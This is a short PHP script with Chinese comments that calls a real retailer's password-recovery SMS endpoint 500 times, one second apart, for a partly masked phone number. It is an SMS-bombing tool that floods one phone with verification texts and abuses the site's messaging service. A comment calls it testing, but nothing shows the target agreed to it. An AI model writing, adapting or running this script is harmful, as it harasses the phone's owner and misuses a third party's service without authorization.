﻿<?php 
define(SUM, 500); //需要访问的次数  
define(L_TIME, 1000); //强制脚本执行的时间  
define(S_TIME, 1); //每次访问之间休眠的时间  
set_time_limit(L_TIME);  
$url = 'http://www.redbaby.com.cn/customer/account/sendMessageforfindP?phonenumber=86159xxxxxxxx'; 
//进行测试  
for ($i=0; $i<SUM; $i++) {  
access_url($url);  
sleep(S_TIME);  
} 

//访问指定URL函数  
function access_url($url) {  
if ($url=='') return false;  
$fp = fopen($url, 'r') or exit('Open url faild!');  
if ($fp) { 
  while (!feof($fp)) { 
   $file = fgets($fp);  
   //echo  $file."/n"; 
  } 
  unset($file); 
}  
}  
?>